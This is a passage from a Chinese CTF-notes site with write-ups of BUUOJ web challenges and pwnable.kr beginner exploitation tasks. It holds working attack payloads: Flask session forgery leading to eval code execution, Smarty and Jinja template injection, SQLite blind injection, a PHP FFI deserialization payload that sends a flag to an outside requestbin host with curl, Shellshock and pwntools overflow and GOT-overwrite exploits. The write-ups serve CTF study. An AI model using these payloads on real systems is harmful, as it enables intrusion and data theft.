&#39;MAX_COOKIE_SIZE&#39;: 4093}&gt; ZeroDivisionError: division by zero 然后又卡住了.... 回去翻了一下源码 for calculation in session[\"history\"]: history.append({**calculation}) if not calculation.get(\"error\"): history[-1][\"result\"] = eval(calculation[\"code\"]) return render_template(\"index.html\", history=list(reversed(history))) history里的代码可以直接执行，那么伪造session就可以rce了 python3 flask_session_cookie_manager3.py encode -s \"cded826a1e89925035cc05f0907855f7\" -t \"{'history':[{'code':'__import__(os).system(\\\"ls \\\")'}]}\" 或者也可用这个脚本生成 from flask.sessions import SecureCookieSessionInterface secret_key = \"cded826a1e89925035cc05f0907855f7\" class FakeApp: secret_key = secret_key fake_app = FakeApp() session_interface = SecureCookieSessionInterface() serializer = session_interface.get_signing_serializer(fake_app) cookie = serializer.dumps( {\"history\": [{\"code\": '__import__(\"os\").popen(\"cat flag.txt\").read()'}]} ) print(cookie) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/ciscn-southeast-2019.html":{"url":"buuoj/ciscn-southeast-2019.html","title":"CISCN2019 华东南赛区","keywords":"","body":"[CISCN2019 华东南赛区]Web11Double SecretWeb4[CISCN2019 华东南赛区] Web11 控制XFF头 Smarty 注入 payload: X-Forwarded-For: {if print_r(file_get_contents(\"/flag\"))}{/if} Double Secret 访问secret传secret参，可以加密 试着试着就报错了，然后看到了部分源码 File \"/app/app.py\", line 35, in secret if(secret==None): return 'Tell me your secret.I will encrypt it so others can\\'t see' rc=rc4_Modified.RC4(\"HereIsTreasure\") #解密 deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!' return a rc4后ssti咯 从网上找个rc4的类 import requests import urllib class RC4: def __init__(self, key): self.key = key self.key_length = len(key) self._init_S_box() def _init_S_box(self): self.Box = [i for i in range(256)] k = [self.key[i % self.key_length] for i in range(256)] j = 0 for i in range(256): j = (j + self.Box[i] + ord(k[i])) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def crypt(self, plaintext): i = 0 j = 0 result = '' for ch in plaintext: i = (i + 1) % 256 j = (j + self.Box[i]) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] t = (self.Box[i] + self.Box[j]) % 256 result += chr(self.Box[t] ^ ord(ch)) return result url='http://2157fe47-3cf2-426f-acba-856acd78bd84.node3.buuoj.cn/secret?secret=' key = RC4('HereIsTreasure') cmd=\"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag.txt', 'r').read() }}{% endif %}{% endfor %}\" payload = urllib.parse.quote(key.crypt(cmd)) res = requests.get(url + payload) print(res.text) Web4 可以read url 题目给了http://baidu.com fuzz了半天 发现不加协议头也能读文件.... GET /read?url=/etc/passwd 然后读app.py看到了源码 # encoding:utf-8 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config['SECRET_KEY'] = str(random.random()*233) app.debug = True @app.route('/') def index(): session['username'] = 'www-data' return 'Hello World! Read somethings' @app.route('/read') def read(): try: url = request.args.get('url') m = re.findall('^file.*', url, re.IGNORECASE) n = re.findall('flag', url, re.IGNORECASE) if m or n: return 'No Hack' res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return 'no response' @app.route('/flag') def flag(): if session and session['username'] == 'fuck': return open('/flag.txt').read() else: return 'Access denied' if __name__=='__main__': app.run( debug=True, host=\"0.0.0.0\" ) 所以可以算secretkey了 读网卡地址/sys/class/net/eth0/address 拿到uuid.getnode() 然后用flask_session_cookie_manager2.py算就可以了 python2 flask_session_cookie_manager2.py encode -s '23.2201597013' -t '{\"username\":\"fuck\"}' © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/bsidescf-2019.html":{"url":"buuoj/bsidescf-2019.html","title":"BsidesCTF 2019","keywords":"","body":"BSidesCF 2019KookiePick Tac ToeSvg MagicMixer参考链接SequelBSidesCF 2019 Kookie ... 用user cookie登上去后抓包吧cookie username改成admin就拿到flag了？ Pick Tac Toe 还是Burp Suite抓包 修改move的参数，棋子可以强制落 Svg Magic Svg应该想到XXE的 就是这个路径... 需要好好积累 /proc/self 表示当前进程目录 Exp ]> &file; Mixer AES ECB 构造密文 根据提示is_admin是个整数 修改cookie:user后出现json串 猜测构造 b0c704f59962d7f398084dee08e152d1 {\"first_name\":\"A 33a6d524a13d47f6a4dd63b5e72ee6eb 1.00000000000000 9ba3107987da6eeb016e3c48dbd7c0bf \",\"last_name\":\"E a36daac88addff9f1ccfd106e564f2b8 ki\",\"is_admin\":0 1d440a6472a927fc8e26e13b39e31fc2 } b0c704f59962d7f398084dee08e152d1 {\"first_name\":\"A 33a6d524a13d47f6a4dd63b5e72ee6eb 1.00000000000000 9ba3107987da6eeb016e3c48dbd7c0bf \",\"last_name\":\"E 4be6c45f5785fddad8e6c21e6ecdd0ac kii\",\"is_admin\": 33a6d524a13d47f6a4dd63b5e72ee6eb 1.00000000000000 1d440a6472a927fc8e26e13b39e31fc2 } 参考链接 https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/ecb-zh/ Sequel Cookie里面可以注SQL 但是最后发现是SQLite,之前在MYSQL上能跑的脚本还跑不出来。。。 贴个脚本学习一下 利用Exist #coding=utf-8 import requests import base64 import string import sys url=\"http://61dcd273-6f78-4432-a87c-a51cf39a5593.node3.buuoj.cn/sequels\" #sql=\"SELECT name FROM sqlite_master WHERE name \" #notes reviews reviews sqlite userinfo sql = \"SELECT username FROM userinfo WHERE name\" out = \"\" while True: for letter in string.printable: tmp = out + letter if(tmp[0]=='n'): continue if(tmp[0]=='r'): continue if(tmp[0]=='s'): continue payload = r'{{\"username\":\"\\\" OR EXISTS({0} LIKE \\\"{1}%\\\" limit 1) OR \\\"\",\"password\":\"guest\"}}'.format(sql,tmp) #匹配以{1}开头的数据表 payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8') r = requests.get(url, cookies={\"1337_AUTH\" : payload}) if (tmp[-1]==\"%\") : exit(0) if \"Movie\" in r.text: out = tmp sys.stdout.write(letter) sys.stdout.flush() break © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"buuoj/rctf-2019.html":{"url":"buuoj/rctf-2019.html","title":"RCTF 2019","keywords":"","body":"RCTF 2019Nextphp参考资料RCTF 2019 Nextphp 直接给了webshell 看一眼phpinfo disabled_function ban了一堆，那么显然考察的是bypass disabled_function 搜集信息 这里用了PHP7.4 FFI support enabled open_basedir /var/www/html /var/www/html opcache.preload /var/www/html/preload.php /var/www/html/preload.php 根据官方文档FFI是可以直接调用系统函数的 比如这样 system(\"id > /tmp/eki\"); echo file_get_contents(\"/tmp/eki\"); @unlink(\"/tmp/eki\"); 但是有个限制是FFI API仅能适用于预加载文件，也就是该题的preload.php 蚁剑连上看下preload.php是啥 null, 'func' => 'print_r', 'arg' => '1' ]; private function run () { $this->data['ret'] = $this->data['func']($this->data['arg']); } public function __serialize(): array { return $this->data; } public function __unserialize(array $data) { array_merge($this->data, $data); $this->run(); } public function serialize (): string { return serialize($this->data); } public function unserialize($payload) { $this->data = unserialize($payload); $this->run(); } public function __get ($key) { return $this->data[$key]; } public function __set ($key, $value) { throw new \\Exception('No implemented'); } public function __construct () { throw new \\Exception('No implemented'); } } 然后我们就通过这个类反序列化来搞 直接修改下$data即可 protected $data = [ 'ret' => null, 'func' => 'FFI::cdef', 'arg' => 'int php_exec(int type, char *cmd);' //调用php执行命令的函数 ]; Payload: ?a=$a=unserialize(base64_decode(\"QzoxOiJBIjo5Nzp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozNDoiaW50IHBocF9leGVjKGludCB0eXBlLCBjaGFyICpjbWQpOyI7fX0=\"));var_dump($a->ret->php_exec(2,%27curl%20http://http.requestbin.buuoj.cn/1f4vjz01?a=`cat%20/flag`%27)); 参考资料 opcache.preload: https://wiki.php.net/rfc/preload FFI 的官方文档： https://www.php.net/manual/en/ffi.examples-basic.php https://www.php.net/manual/en/ffi.examples-callback.php © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"pwnable.kr/":{"url":"pwnable.kr/","title":"pwnable.kr","keywords":"","body":"PWNABLE.KRPWNABLE.KR 地址：https://pwnable.kr © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"pwnable.kr/toddlers-bottle.html":{"url":"pwnable.kr/toddlers-bottle.html","title":"Toddler's Bottle","keywords":"","body":"Pwnable.kr Toddler's Bottle0x00 前言0x01 fdExp0x02 collisionExp0x03 bof0x04 flag0x05 passcode0x06 random0x07 inputStage 1 argvStage 2 stdioStage3 envStage 4 fileStage 5 networkFinal0x08 legExp参考资料0x09 misktakeExp0x0A shellsock0x0B coin0x0C blackjack0x0D lotto0x0E cmd10x0F cmd20x10 uaf前置知识：类重载·虚函数Use-After-Free分析源码参考资料0x11 memcpy0x12 shellcode0x13 unlink前置知识 DWORD SHOOTExp参考资料：0x14 blukat0x15 horcruxesPwnable.kr Toddler's Bottle 0x00 前言 被web题虐到自闭。。。。 想着去水一水pwn的新手题找找自信。。。。 结果还是被虐。。。。 最终总算是艰难的做完了 收货： pwntool ssh的连接方法和对应exp的写法 pwntool recvline 截leak值的技巧 agrc agrv envp 的意义 用python 交互行完成简单的运算 经典堆/栈溢出 经典uaf 经典unlink 经典rop 基础shellshock pipe通信 Todo: 32/64位程序寄存器的理解 结构体/类的内存布局 socket编程 对基础pwn知识更深入的了解 0x01 fd 利用pwntool的ssh download_file功能下载源码 int main(int argc, char* argv[], char* envp[]){ if(argc 关于agrc agrv envp 第一个参数argc记录了输入参数的个数。 第二个参数是字符串数组的，字符串数组的每个单元是char*类型的，指向一个c风格字符串，arg[ ]指向的数组中至少有一个字符指针，即arg[0].他通常指向程序中的可执行文件的文件名。 第三个参数是用来取得系统的环境变量，如：在DOS下，有一个PATH变量。当你在DOS提示符下输入一个命令的时候，DOS会首先在当前目录下找这个命令的执行文件。如果找不到，则到PATH定义的路径下去找，找到则执行，找不到返回Bad command or file name 。在DOS命令提示符下键入set可查看系统的环境变量 关于参数fd fd 是打开的文件的句柄,它代表的是你打开的文件, > stdin 标准输入的文件标识符为0 stdout 标准输出的文件标识符为1 stderr 标准错误输出的文件标识符为2 所以我们只要让fd为0指向标准输入流 再输入“LETMEWIN\\n”就行了 Exp #coding=utf-8 from pwn import * payload=str(0x1234) shell=ssh(host='pwnable.kr',user='fd',password='guest',port=2222) #shell.download_file('fd.c') sh = shell.run('./fd'+' '+payload) payload=\"LETMEWIN\" sh.sendline(payload) sh.interactive() 0x02 collision 下载得到核心源码 unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p;//把字符指针强转为int指针 char(1字节*4)->int(4字节) int i; int res=0; for(i=0; i 怎么构造p呢，粗暴平均分。。。。除5有小数就调整一下 >>>hex(int(0x21DD09EC+1)/5) '0x6c5cec9' 然后可以构造exp Exp #coding=utf-8 from pwn import * payload=p32(0x6c5cec9)*4+p32(0x6c5cec8) shell=ssh(host='pwnable.kr',user='col',password='guest',port=2222) #shell.download_file('col.c') sh = shell.run('./col'+' '+payload) sh.interactive() 0x03 bof 最经典的gets溢出覆盖 在ida 里看参数a1和buf的差距，溢出覆盖就行了 #coding=utf-8 from pwn import * io=remote(\"pwnable.kr\",9000) payload='a'*(0x2c+0x8)+p32(0xcafebabe) io.sendline(payload) io.interactive() 0x04 flag 直接下载下来用ida pro分析发现只有三个函数，而且还有一大堆shellcode在里面。。。。。 后来意识到可能加了壳，用 upx -d flag 脱壳后就可以正常ida pro逆向了 可以直接在里面找到flag 0x05 passcode 放到ida里分析 int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(\"enter passcode1 : \"); __isoc99_scanf(\"%d\"); fflush(stdin); printf(\"enter passcode2 : \"); __isoc99_scanf(\"%d\"); puts(\"checking...\"); if ( v1 != 338150 || v2 != 13371337 ) { puts(\"Login Failed!\"); exit(0); } 只要让 v1 == 338150 && v2 == 13371337 一开始以为welcome()和login()栈上为初始化，可以直接用weclome里的name进行覆盖passcode1,passcode2 void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } 但事实上由于passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9），又是用scanf %s,存在00截断,所以无法做到覆盖。。。 写了一个脚本发现 %100s 是会读100个字节（包括零字节） 再看看栈布局 //welcome() char v1; // [esp+18h] [ebp-70h] unsigned int v2; // [esp+7Ch] [ebp-Ch] //这里的v2是Canary //login() int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] 因为两次ebp不变，所以是可以覆盖的，但是只能覆盖到passcode1，也就是v1,v2由于Canary的开启无法被覆盖。。。 那怎么办呢， 注意到checksec告诉我们这个程序是没有开PIE（地址无关可执行文件）的，所以我们可以试着Hijack GOT GOT 表的初始值都指向 PLT 表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT 表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT 表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT 表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。 如何确定函数 A 在 GOT 表中的条目位置？ 程序调用函数时是通过 PLT 表跳转到 GOT 表的对应条目，所以可以在函数调用的汇编指令中找到 PLT 表中该函数的入口点位置，从而定位到该函数在 GOT 中的条目。 摘自《手把手教你栈溢出从入门到放弃（下)》https://zhuanlan.zhihu.com/p/25892385 实际上，可以利用scanf来修改此后使用到的某个函数的got表项。 .text:080485E3 mov dword ptr [esp], offset command ; \"/bin/cat flag\" .text:080485EA call _system 所以我们把地址修改到修改到0x080485E3就可以了 比如上面程序在 scanf(\"%d\", passcode1); 后立即使用了fflush函数，所以我们可以先找到fflush的got表项地址， 把覆盖passcode1为该地址 并在调用到scanf(“%d”, passcode1) 时输入程序代码中调用system(\"/bin/cat flag\");处的地址(可在ida中找到)即可。 然后程序在执行fflush函数时就会执行system(\"/bin/cat flag\"); Exp: #coding=utf-8 from pwn import * elf = ELF(\"./passcode\") fflush_got = elf.got[\"fflush\"] #print(hex(fflush_got)) sysh_addr=0x080485E3 shell=ssh(host='pwnable.kr',user='passcode',password='guest',port=2222) #shell.download_file(\"./passcode.c\") #shell.download_file(\"./passcode\") payload=\"a\"*(100-4)+p32(fflush_got) sh=shell.run('./passcode') sh.sendlineafter(\"enter you name :\",payload) payload=str(sysh_addr) sh.sendlineafter(\"enter passcode1 :\",payload) sh.interactive() 0x06 random 关键源码 unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", &key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } 我们知道rand()是一个根据srand(seed)生成的伪随机数列，然后这里的seed又是固定的（未调用srand()） 就可以写Exp了 Exp: #coding=utf-8 from pwn import * from ctypes import * context(arch = 'amd64', os = 'linux') libc=cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\") shell=ssh(host='pwnable.kr',user='random',password='guest',port=2222) #shell.download_file(\"./random.c\") #shell.download_file(\"./random\") payload=str(0xdeadbeef^(libc.rand())) sh=shell.run('./random') sh.sendline(payload) sh.interactive() 0x07 input 考察程序的各项基本操作 可惜我还没有那么多“常识” Stage 1 argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); 一开始直接写 #payload=\" a\"*(ord('A')-1)+\" \\x00\"+\" a\"*(ord('B')-ord('A'))+\" \\x20\\x0a\\x0d\"+' a'*(100-ord('B')+1) #sh=shell.run('./input'+payload) 发现\\x20\\x0a\\x0d是空格换行回车。。。。会被当成分隔符不被读入。。。。 当然你也可以通过设置手动设置分隔符的方式通过Stage1 IFS='-'//设置分隔符为“-” ./input `python-c 'print\"aaa-\"*64+\"\\x00-\"+\"\\x20\\x0a\\x0d-\"+\"aaa-\"*33'` 最后还是发现写c脚本更好用 Exp #include #include int main(){ char *argv[101]={\"./input\", [1 ... 99]=\"A\",/*C11 lambda表达式*/ NULL}, *envp[2]; argv['A']=\"\\x00\"; argv['B']=\"\\x20\\x0a\\x0d\"; execve(\"./input\",argv,envp); return 0; } Stage 2 stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); 标准输入输出流(0:stdin,1:stdout,2:stderr) 0还好办，2怎么控制呢？ 可以利用pipe进行进程间通信 具体过程如下 Create two pipes: pipe2stdin and pipe2stderr Fork the process Child: write “\\x00\\x0a\\x00\\xff” to pipe2stdin write “\\x00\\x0a\\x02\\xff” to pipe2stderr Parent: map the stdin to pipe2stdin map the stderr to pipe2stderr substitute the process with the execution of ‘input’ Exp #include #include #include int main(){ char *argv[101]={\"./input\", [1 ... 99]=\"A\", NULL}, *envp[2]; argv['A']=\"\\x00\"; argv['B']=\"\\x20\\x0a\\x0d\"; int pipe_stdin[2] = {-1,-1}; int pipe_stderr[2] = {-1,-1}; pid_t pid_child; if(pipe(pipe_stdin) 参考资料： Linux Socket编程 http://unixwiz.net/techtips/remap-pipe-fds.html Stage3 env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); 同agrv一样，改下envp就行 Exp #include #include #include int main(){ char *argv[101]={\"./input\", [1 ... 99]=\"A\", NULL}, *envp[2]={\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\",NULL}; argv['A']=\"\\x00\"; argv['B']=\"\\x20\\x0a\\x0d\"; int pipe_stdin[2] = {-1,-1}; int pipe_stderr[2] = {-1,-1}; pid_t pid_child; if(pipe(pipe_stdin) Stage 4 file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); 写一个文件 #include #include #include int main(){ char *argv[101]={\"./input\", [1 ... 99]=\"A\", NULL}, *envp[2]={\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\", NULL}; argv['A']=\"\\x00\"; argv['B']=\"\\x20\\x0a\\x0d\"; int pipe_stdin[2] = {-1,-1}; int pipe_stderr[2] = {-1,-1}; pid_t pid_child; if(pipe(pipe_stdin) Stage 5 network // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\"socket error, tell admin\\n\"); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) 要求写个socket通信 一些前置知识： AF_UNIX（本机通信） AF_INET（TCP/IP – IPv4） AF_INET6（TCP/IP – IPv6） AF = Address Family PF = Protocol Family socket编程中需要用到的头文件 sys/types.h：数据类型定义 sys/socket.h：提供socket函数及数据结构 netinet/in.h：定义数据结构sockaddr_in arpa/inet.h：提供IP地址转换函数 netdb.h：提供设置及获取域名的函数 sys/ioctl.h：提供对I/O控制的函数 sys/poll.h：提供socket等待测试机制的函数 照着大佬的wp写了一遍 Exp #include #include #include #include #include #include//socket #include #include #include int main(){ char *argv[101]={\"./input\", [1 ... 99]=\"A\", NULL}, *envp[2]={\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\", NULL}; argv['A']=\"\\x00\"; argv['B']=\"\\x20\\x0a\\x0d\"; argv['C']=\"55555\";//socket端口 int pipe_stdin[2] = {-1,-1}; int pipe_stderr[2] = {-1,-1}; pid_t pid_child; if(pipe(pipe_stdin) 如果作为一个服务器，在调用socket()、bind()之后就会调用listen()来监听这个socket，如果客户端这时调用connect()发出连接请求，服务器端就会接收到这个请求。 int listen(int sockfd, int backlog); int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); listen函数的第一个参数即为要监听的socket描述字，第二个参数为相应socket可以排队的最大连接个数。socket()函数创建的socket默认是一个主动类型的，listen函数将socket变为被动类型的，等待客户的连接请求。 connect函数的第一个参数即为客户端的socket描述字，第二参数为服务器的socket地址，第三个参数为socket地址的长度。客户端通过调用connect函数来建立与TCP服务器的连接。 参考资料 socket 编程 https://www.cnblogs.com/skynet/archive/2010/12/12/1903949.html socket编程中write、read和send、recv之间的区别 https://www.cnblogs.com/George1994/p/6731091.html Final 在本地上可以过了 但是在服务器上还需要一些改动 首先题目目录是不可写的 所以我们要把程序放在其他地方 看可写目录· ls -al / drwxrwx-wt 5677 root root 159744 Dec 5 09:36 tmp 修改远程脚本 #include #include #include #include #include #include//socket #include #include #include int main(){ char *argv[101]={\"/home/input2/input\", [1 ... 99]=\"A\", NULL}, *envp[2]={\"\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe\", NULL}; argv['A']=\"\\x00\"; argv['B']=\"\\x20\\x0a\\x0d\"; argv['C']=\"55566\"; int pipe_stdin[2] = {-1,-1}; int pipe_stderr[2] = {-1,-1}; pid_t pid_child; if(pipe(pipe_stdin) 还有一个坑点是程序拿flag是当前目录下的 而当前目录/tmp下并没有 所以还要创建一个软连接 ln /home/input/flag flag 放在服务器上跑一跑就出flag了 0x08 leg 通过分析arm平台汇编代码计算三个key值 key1 (gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 : push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 : add r11, sp, #0 0x00008cdc : mov r3, pc 0x00008ce0 : mov r0, r3 0x00008ce4 : sub sp, r11, #0 0x00008ce8 : pop {r11} ; (ldr r11, [sp], #4) 0x00008cec : bx lr End of assembler dump. r3为程序返回值，pc=0x00008cdc+8 对于ARM指令集而言，PC总是指向当前指令的下两条指令的地址(ARM体系结构采用的多级流水线技术),即PC的值为当前指令的地址值加8个字节程序状态寄存器。 所以 key1=0x00008cdc+0x08 (gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 : push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 : add r11, sp, #0 0x00008cf8 : push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc : add r6, pc, #1 0x00008d00 : bx r6 ;r6最后一位是1 进入ARM thumb模式 pc=当前地址+4 0x00008d04 : mov r3, pc 0x00008d06 : adds r3, #4 0x00008d08 : push {r3} 0x00008d0a : pop {pc} 0x00008d0c : pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 : mov r0, r3 0x00008d14 : sub sp, r11, #0 0x00008d18 : pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c : bx lr End of assembler dump. 所以有 key2=0x00008d04+0x04+0x04 key3 (gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 : push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 : add r11, sp, #0 0x00008d28 : mov r3, lr 0x00008d2c : mov r0, r3 0x00008d30 : sub sp, r11, #0 0x00008d34 : pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 : bx lr End of assembler dump. 可以看到r3=lr lr是key3的程序返回地址 在main里找一下 (gdb) disass main Dump of assembler code for function main: 0x00008d3c : push {r4, r11, lr} 0x00008d40 : add r11, sp, #8 0x00008d44 : sub sp, sp, #12 0x00008d48 : mov r3, #0 0x00008d4c : str r3, [r11, #-16] 0x00008d50 : ldr r0, [pc, #104] ; 0x8dc0 0x00008d54 : bl 0xfb6c 0x00008d58 : sub r3, r11, #16 0x00008d5c : ldr r0, [pc, #96] ; 0x8dc4 0x00008d60 : mov r1, r3 0x00008d64 : bl 0xfbd8 0x00008d68 : bl 0x8cd4 0x00008d6c : mov r4, r0 0x00008d70 : bl 0x8cf0 0x00008d74 : mov r3, r0 0x00008d78 : add r4, r4, r3 0x00008d7c : bl 0x8d20 0x00008d80 : mov r3, r0 ;在这 0x00008d84 : add r2, r4, r3 0x00008d88 : ldr r3, [r11, #-16] 0x00008d8c : cmp r2, r3 0x00008d90 : bne 0x8da8 0x00008d94 : ldr r0, [pc, #44] ; 0x8dc8 0x00008d98 : bl 0x1050c 0x00008d9c : ldr r0, [pc, #40] ; 0x8dcc 0x00008da0 : bl 0xf89c 0x00008da4 : b 0x8db0 0x00008da8 : ldr r0, [pc, #32] ; 0x8dd0 0x00008dac : bl 0x1050c 0x00008db0 : mov r3, #0 0x00008db4 : mov r0, r3 0x00008db8 : sub sp, r11, #8 0x00008dbc : pop {r4, r11, pc} 0x00008dc0 : andeq r10, r6, r12, lsl #9 0x00008dc4 : andeq r10, r6, r12, lsr #9 0x00008dc8 : ; instruction: 0x0006a4b0 0x00008dcc : ; instruction: 0x0006a4bc 0x00008dd0 : andeq r10, r6, r4, asr #9 End of assembler dump. 所以 key3=0x00008d80 Exp #coding=utf-8 from pwn import * shell=ssh(host='pwnable.kr',user='leg',password='guest',port=2222) key1=0x00008cdc+0x08 key2=0x00008d04+0x04+0x04 key3=0x00008d80 print(str(key1+key2+key3)) leg=shell.run(\"sh\") leg.sendline(str(key1+key2+key3)) leg.interactive() 参考资料 http://blog.chinaunix.net/uid-28458801-id-3792828.html https://www.cnblogs.com/wrjvszq/p/4199682.html 0x09 misktake 看了很久才反应过来是运算符优先级的问题 if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) 然后自己构造一组密码就行 比如 0000000000 -xor()-> 1111111111 Exp #coding=utf-8 from pwn import * shell=ssh(host='pwnable.kr',user='mistake',password='guest',port=2222) #shell.download_file(\"./mistake.c\") #shell.download_file(\"./mistake\") io=shell.run('./mistake') payload=\"0000000000\" io.sendafter(\"do not bruteforce...\\n\",payload) payload=\"1111111111\" io.sendafter(\"input password : \",payload) io.interactive() 0x0A shellsock CVE-2014-6271 Shellsock 利用方式： env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" 原理分析：https://blog.csdn.net/tinyletero/article/details/40261593 题目源码 #include int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\"/home/shellshock/bash -c 'echo shock_me'\"); return 0; } 程序目录权限(ls -l) -r-xr-xr-x 1 root shellshock 959120 Oct 12 2014 bash -r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flag -r-xr-sr-x 1 root shellshock_pwn 8547 Oct 12 2014 shellshock -r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c 注意到 flag是shellshock_pwn可读的 所以我们可以利用./shellsock程序获得读权限，加上之前利用shellsock拼接的“cat flag”就可以读到flag了 Exp: #coding=utf-8 from pwn import * shell=ssh(host='pwnable.kr',user='shellshock',password='guest',port=2222) #shell.download_file(\"./shellshock.c\") #shell.download_file(\"./shellshock\") sh=shell.run('sh') sh.sendline(\"env x='() { :;}; bash -c \\\"cat flag\\\" ' ./shellshock\") sh.interactive() 0x0B coin 称硬币找不同 直接二分就可 #coding=utf-8 from pwn import * import re #正则表达式取数 io=remote(\"pwnable.kr\",\"9007\") io.recv() def GetWeight(l,r): sendstr = \"\" if l==r: io.sendline(str(l)) else : for i in range(l,r+1): sendstr = sendstr + str(i)+\" \" io.sendline(sendstr) ret = io.recvline() return int(ret) def solve(num,chance): l=0 r=num-1 weight=0 for i in range(0,chance): weight=GetWeight(l,int(l+(r-l)/2)) if weight%10!=0: r = int(l+(r-l)/2) else: l = int(l+(r-l)/2)+1 io.sendline(str(r)) print '[+]server:',io.recvline() for i in range(0,100): quest = io.recvline() q = re.compile(r'\\d+')#取数字 data = q.findall(quest) N = int(data[0]) C = int(data[1]) #print N,C solve(N,C) io.interactive() 本地跑了20个就60s了，放在服务器上跑才过。。。（利用input那道题的账户。。。。。） 0x0C blackjack 程序逻辑漏洞 下负数赌注，输了就拿到正数的钱了。。。。。。。 0x0D lotto 源码中比较过程存在问题 int match = 0, j = 0; for(i=0; i 大大降低了爆破难度，跑个脚本就可以了 Exp #coding=utf-8 from pwn import * shell=ssh(\"lotto\",\"pwnable.kr\",2222,\"guest\") #shell.download_file(\"./lotto.c\") sh=shell.run(\"./lotto\") sh.recv() payload=chr(1)+chr(1)+chr(1)+chr(1)+chr(1)+chr(1) while 1: sh.sendline(\"1\") print sh.recv() sh.sendline(payload) text=sh.recv() print len(text) if len(text)>71: print text break 0x0E cmd1 #include #include int filter(char* cmd){ int r=0; r += strstr(cmd, \"flag\")!=0; r += strstr(cmd, \"sh\")!=0; r += strstr(cmd, \"tmp\")!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } 可以看到设置了PATH 到/thankyoueverymuch,所以在/bin的二进制文件比如ls,pwd啥的就不能用了。。。。 但是可以绝对引用啊，然后cat是支持通配符的，就可以绕过了 Exp: #coding=utf-8 from pwn import * shell=ssh(host='pwnable.kr',user='cmd1',password='guest',port=2222) 